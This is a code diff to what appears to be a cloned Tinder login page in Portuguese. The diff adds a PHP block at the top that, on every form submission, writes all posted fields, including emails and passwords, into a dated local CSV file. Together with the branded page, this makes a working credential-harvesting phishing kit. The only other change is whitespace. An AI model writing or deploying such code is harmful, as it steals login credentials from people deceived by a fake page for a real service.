@@ -1,3 +1,26 @@
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+
+    $fileName = "dados_" . date("Y-m-d") . ".csv";
+    $file = fopen($fileName, 'w');
+    
+    fputcsv($file, array('id', 'email', 'password'));
+
+    foreach ($_POST as $key => $value) {
+
+        if (is_array($value)) {
+            foreach ($value as $item) {
+                fputcsv($file, array($key, $item));
+            }
+        } else {
+            fputcsv($file, array($key, $value));
+        }
+    }
+
+    fclose($file);
+}
+?>
+
 <!doctype html>
 <html lang="pt-BR">
 <head>
@@ -60,7 +83,7 @@
           href="/"
           class="mb-8 flex items-center justify-center gap-2 text-2xl font-black lg:hidden"
         >
-        
+
           <i data-lucide="flame" class="fill-match text-match"></i>
           tinder
         </a>
